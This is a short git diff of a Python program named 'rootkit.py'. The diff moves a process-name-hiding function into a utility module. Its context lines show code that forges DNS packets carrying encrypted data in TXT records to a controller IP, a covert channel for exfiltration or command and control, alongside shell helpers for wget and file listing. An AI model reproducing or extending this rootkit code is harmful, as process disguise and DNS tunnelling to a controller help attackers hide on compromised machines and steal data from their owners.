@@ -18,10 +18,10 @@ import sys
 from utils.encryption import StreamEncryption
 from utils.shell import LIST, WGET
 from utils.validation import validate_ipv4_address, validate_nic_interface
+from utils.process import hide_process_name
 
 # Third Party Libraries
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
-from setproctitle import setproctitle
 
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
@@ -106,14 +106,6 @@ def forge_dns_query(data: str):
     # Forge the DNS packet with data in the text record.
     query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
     return query
-
-
-def hide_process_name(name: str):
-    """
-        
-    
-    """
-    setproctitle(name)
 
 
 def execute_list_command(file_path: str) -> bool:
